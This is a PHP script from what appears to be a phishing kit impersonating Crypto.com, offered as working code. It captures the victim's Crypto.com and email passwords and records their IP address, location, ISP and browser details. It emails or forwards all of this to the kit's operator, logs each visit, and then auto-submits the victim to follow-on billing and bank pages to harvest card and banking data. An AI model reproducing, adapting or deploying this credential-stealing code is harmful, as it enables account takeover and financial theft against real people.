<?php
session_start();
include'../main.php';
include'../get_setting.php';
if (!isset($_POST['email'])) {
	exit(header("HTTP/1.0 404 Not Found"));
}else{
$ip = getUserIP();
$subject = "EMAIL ACCESS [".$_POST['email']."] - [".$cn." - ".$ip." - ".$br."]";
$message = '
<head>
<style>
body {
font-family:sans-serif;
}
</style>
</head>
<center> 
<div style="background: url(https://i.ibb.co/Zhv168g/logo.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
<div style="background: rgba(0, 0, 0, 0.4); width: 100%; height: 100%; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
</div>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;"><b>CRYPTO.COM LOGIN</b></div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>EMAIL</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['email'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['pass_log'].'</th>
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;"><b>EMAIL LOGIN</b></div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>EMAIL</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['email'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['password'].'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;"><b>DEVICE INFORMATION</b></div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$cn.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$regioncity.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$citykota.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>CONTINENT</th>
<th style="width: 78%; text-align: center;"><b>'.$continent.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>USER AGENT</th>
<th style="width: 78%; text-align: center;"><b>'.$user_agent.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>ISP</th>
<th style="width: 78%; text-align: center;"><b>'.$ispuser.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>IP</th>
<th style="width: 78%; text-align: center;"><b>'.$ip.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>OS / BROWSER</th>
<th style="width: 78%; text-align: center;"><b>'.$os.' / '.$br.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>TIMEZONE</th>
<th style="width: 78%; text-align: center;"><b>'.$timezone.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>DATE</th>
<th style="width: 78%; text-align: center;"><b>'.$date.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;"><b>SPM55</b></div>
</center>
';
if ($send_login == "email") {
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'FROM: EMAIL ACCESS <'.$sender_mail.'>' . "\r\n";
include'.api.php';
mail($email_result, $subject, $message, $headers);
tulis_file("../result/email.txt", $ip);
tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|EMAIL LOGIN");
}else{
include'.api.php';
include'server.php';
tulis_file("../result/email.txt", $ip);
tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|EMAIL LOGIN");
}
if ($get_cc == "on") {
	echo "
	<form id='boyxd' method='POST' action='../billing'>
	<input type='hidden' name='email' value='".$_POST['email']."'>
	<input type='hidden' name='pass_log' value='".$_POST['pass_log']."'>
	</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}else{
if ($get_bank == "on") {
	echo "
	<form id='boyxd' method='POST' action='../bank'>
	<input type='hidden' name='email' value='".$_POST['email']."'>
	<input type='hidden' name='pass_log' value='".$_POST['pass_log']."'>
	</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}else{
echo "
	<form id='boyxd' method='POST' action='../success'>
	<input type='hidden' name='email' value='".$_POST['email']."'>
	</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
}
}
?>